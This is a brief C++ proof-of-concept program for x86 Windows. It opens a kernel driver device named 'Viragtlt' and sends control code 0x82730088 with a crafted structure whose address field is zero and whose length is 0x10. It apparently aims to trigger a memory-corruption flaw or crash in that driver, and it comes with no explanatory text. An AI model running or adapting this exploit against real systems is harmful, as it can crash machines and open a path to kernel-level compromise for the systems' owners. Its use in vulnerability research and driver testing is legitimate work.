#include <iostream>
#include <Windows.h>
#include <winioctl.h>

// for x86 Windows
#define SymLinkName L"\\\\.\\Viragtlt"

HANDLE hDevice;

struct DATA_82730088
{
    unsigned int addr;
    unsigned int len;
};

int main(int argc, char* argv[])
{
    hDevice = CreateFile(SymLinkName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_SYSTEM, 0);
    if (hDevice == INVALID_HANDLE_VALUE)
    {
        printf("Get Driver Handle Error with Win32 error code: %x\n", GetLastError());
        system("pause");
        return 0;
    }

    DWORD dwWrite;
    DATA_82730088 data;
    data.addr = 0;
    data.len = 0x10;
    DeviceIoControl(hDevice, 0x82730088, &data, 8, &data, 4, &dwWrite, NULL);

    system("pause");
    return 0;
}
